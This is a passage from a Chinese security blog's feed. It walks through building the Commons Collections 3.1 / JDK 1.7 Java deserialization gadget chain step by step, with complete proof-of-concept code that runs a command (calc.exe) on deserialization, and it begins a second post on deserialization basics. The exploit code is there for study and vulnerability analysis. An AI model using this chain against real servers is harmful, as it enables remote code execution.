Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，再调用transform函数</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78b0axl7ej31pj184k2w.jpg" alt="payload客户端构造.png"></p><p>完成命令执行服务端执行如下操作：</p><ol><li>服务端反序列化我们的输入成<strong>ChainedTransformer</strong>类型</li><li>调用这个输入的transform()函数</li></ol><p>转变的类型是一个数据转化链数据格式，很明显服务端不可能存在这种代码，利用价值不足，接下来我们需要继续延长这个漏洞链。</p><h4 id="封装成Map"><a href="#封装成Map" class="headerlink" title="封装成Map"></a>封装成Map</h4><p>由于我们得到的是ChainedTransformer，一个转换链，<strong>TransformedMap</strong>类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p><p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。很明显后者是一个常规操作，极有可能被触发。</p><p><code>TransformedMap</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>try一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">    <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">    <span class="comment">//给予map数据转化链</span></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(outerMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.服务端接受反序列化，出发漏洞</span></span><br><span class="line">    <span class="comment">//读取文件，反序列化，模拟网络传输</span></span><br><span class="line">    FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务端反序列化成Map格式，再调用transform函数</span></span><br><span class="line">    Map outerMap_now =  (Map)fin.readObject();</span><br><span class="line">    <span class="comment">//2.1可以直接map添加新值，触发漏洞</span></span><br><span class="line">    <span class="comment">//outerMap_now.put("123", "123");</span></span><br><span class="line">    <span class="comment">//2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞</span></span><br><span class="line">    Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">    onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>亲测有效</p><h3 id="第四步-jdk1-7-AnnotationInvocationHandler的readObject复写点"><a href="#第四步-jdk1-7-AnnotationInvocationHandler的readObject复写点" class="headerlink" title="第四步 jdk1.7 AnnotationInvocationHandler的readObject复写点"></a>第四步 jdk1.7 AnnotationInvocationHandler的readObject复写点</h3><p>上面的漏洞触发条件仍然不够完美，需要服务端把我们传入的序列化内容反序列化为map，并对值进行修改。<br>之前也说过完美的反序列化漏洞还需要一个readobject复写点，使只要服务端执行了readObject函数就等于命令执行。</p><p>在jdk1.7中就存在一个完美的readobject复写点的类<code>sun.reflect.annotation.AnnotationInvocationHandler</code>。<br>我們先看他的构造函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;<span class="comment">//var1满足这个if条件时</span></span><br><span class="line">        <span class="keyword">this</span>.type = var1;<span class="comment">//传入的var1到this.type</span></span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;<span class="comment">//我们的map传入this.memberValues</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>readobject复写函数：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//默认反序列化</span></span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();<span class="comment">//</span></span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();<span class="comment">//获取我们构造map的迭代器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();<span class="comment">//遍历map迭代器</span></span><br><span class="line">            String var6 = (String)var5.getKey();<span class="comment">//获取key的名称</span></span><br><span class="line">            Class var7 = (Class)var3.get(var6);<span class="comment">//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();<span class="comment">//获取map的value</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>虽然相对于这个类具体做什么，实在是没有精力去搞清楚了，但是它最终对于我们传入构造函数的map进行遍历赋值。<br>这样就弥补了我们之前反序列化需要服务端存在一些条件的不足，形成完美反序列化攻击。</p><p>最终模拟攻击代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">    <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">    <span class="comment">//给予map数据转化链</span></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">    <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">    Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">    Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">    FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">    <span class="comment">//服务端反序列化</span></span><br><span class="line">    fin.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>成功<br><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g78b0itdcgj3231129wki.jpg" alt="end.png"></p><p>至此，我们在客户端构造了payload发送至服务端，<br>只要服务端</p><ol><li>对我们的输入进行反序列化</li><li>jdk版本为1.7</li></ol><p>就可以直接完成命令执行，完美！</p><h4 id="jdk1-8为什么不行呢"><a href="#jdk1-8为什么不行呢" class="headerlink" title="jdk1.8为什么不行呢"></a>jdk1.8为什么不行呢</h4><p>那么jdk1.8为啥不行呢,看一下jdk8里面的<code>sun.reflect.annotation.AnnotationInvocationHandler</code> readObject复写点：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        GetField var2 = var1.readFields();</span><br><span class="line">        Class var3 = (Class)var2.get(<span class="string">"type"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">        Map var4 = (Map)var2.get(<span class="string">"memberValues"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">        AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var5 = AnnotationType.getInstance(var3);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var6 = var5.memberTypes();</span><br><span class="line">        LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">        String var10;</span><br><span class="line">        Object var11;</span><br><span class="line">        <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">            Entry var9 = (Entry)var8.next();</span><br><span class="line">            var10 = (String)var9.getKey();</span><br><span class="line">            var11 = <span class="keyword">null</span>;</span><br><span class="line">            Class var12 = (Class)var6.get(var10);</span><br><span class="line">            <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var11 = var9.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//很伤心的，没有了map赋值语句</span></span><br><span class="line">                    var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() + <span class="string">"["</span> + var11 + <span class="string">"]"</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>因为这个函数出现了变动，不再有赋值语句，所以触发不了漏洞。</p><h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>至此我们就完成common-collection 3.1版本 jdk1.7版本下的POC复现和利用链分析。<br>当然还有common-collection 不同组件版本，不同环境下poc和利用链均有不同，在ysoserial下就有7，8中利用方式。<br>还可以通过rmi模式进行利用等。</p><p>但是由于这篇博客写的太长了，思路也一直断断续续，其他内容之后再陆续学习分析吧~</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>参考资料大多从先知中获取，这里就列举一部分。<br><a href="https://xz.aliyun.com/t/4711#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711#toc-3</a><br><a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">http://blog.orleven.com/2017/11/11/java-deserialize/</a><br><a href="https://mp.weixin.qq.com/s/gZbcdS0TbAetZwVMyjkGWQ" target="_blank" rel="noopener">玩转ysoserial-CommonsCollection的七种利用方式分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在此文中着重一点点复现推导了commons-collections、jdk1.7的poc的构造，记录了踩得一个个坑。&lt;br&gt;需要结合反射机制一文食用。&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-基础</title>
    <link href="http://lalajun.com/2019/08/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%9F%BA%E7%A1%80/"/>
    <id>http://lalajun.com/2019/08/20/java反序列化-基础/</id>
    <published>2019-08-20T06:58:45.000Z</published>
    <updated>2019-10-14T03:11:44.654Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要分成四部分</p><ul><li>java序列化与反序列化的正常使用</li><li>java反序列化readObject是如何构成漏洞的</li><li>java反序列化的服务器环境中是否需要序列化的类的定义，才能触发反序列化漏洞？</li><li>为何readObject复写是需要使用private属性并且传参java.io.ObjectInputStream这个特定的格式？</li></ul><p>首先从使用java反序列化开始</p><h2 id="序列化与反序列化的正常使用"><a href="#序列化与反序列化的正常使用" class="headerlink" title="序列化与反序列化的正常使用"></a>序列化与反序列化的正常使用</h2><p>先来看代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.attribute.UserDefinedFileAttributeView;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">trytry</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//整一个需要序列化的对象</span></span><br><span class="line">        user u = <span class="keyword">new</span> user();</span><br><span class="line">        u.setName(<span class="string">"lala"</span>);</span><br><span class="line">        <span class="comment">//序列化输出至屏幕</span></span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(System.out);</span><br><span class="line">        out.writeObject(u);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">//序列化写入文件</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"test.bin"</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(u);</span><br><span class="line">        <span class="comment">//序列化写入到变量中</span></span><br><span class="line">        ByteArrayOutputStream bOut = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(bOut);</span><br><span class="line">        objOut.writeObject(u);</span><br><span class="line">        <span class="keyword">byte</span>[] str= bOut.toByteArray();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(str));</span><br><span class="line">        <span class="comment">//从变量中反序列化</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(str));</span><br><span class="line">        user u_d = (user) ois.readObject();</span><br><span class="line">        System.out.println(u_d.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>执行结果如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">�� sr user_AO���j L namet Ljava/lang/String;xpt lala</span><br><span class="line">�� sr user_AO���j L namet Ljava/lang/String;xpt lala</span><br><span class="line">lala</span><br></pre></td></tr></table></figure><p>一个类的对象想要序列化成功，需要满足一个条件：</p><ol><li>该类必须实现java.io.Serializable或Externalizable接口</li></ol><p>同时类中不是全部内容都是可以序列化的，还有不能被序列化的情况：</p><ol><li>如果该类有父类，则分两种情况来考虑：<ul><li>如果该父类已经实现了可序列化接口，则其父类的相应字段及属性的处理和该类相同；</li><li>如果该类的父类没有实现可序列化接口，则该类的父类所有的字段属性将不会序列化，并且反序列化时会调用父类的默认构造函数来初始化父类的属性，而子类却不调用默认构造函数，而是直接从流中恢复属性的值。</li></ul></li><li>如果该类的某个属性标识为static类型的，则该属性不能序列化。</li><li>如果该类的某个属性采用transient关键字标识，则该属性不能序列化。</li></ol><p>如果你想知道一个 Java 标准类是否是可序列化的，可以通过查看该类的文档,查看该类有没有实现 java.io.Serializable接口。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞关键在于调用<code>readObject()</code>,截取以上代码的关键漏洞代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(str))</span><br><span class="line">user u_d = (user) ois.readObject();</span><br></pre></td></tr></table></figure></p><p>那我们试着用网上的payload来复写readObject，<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span 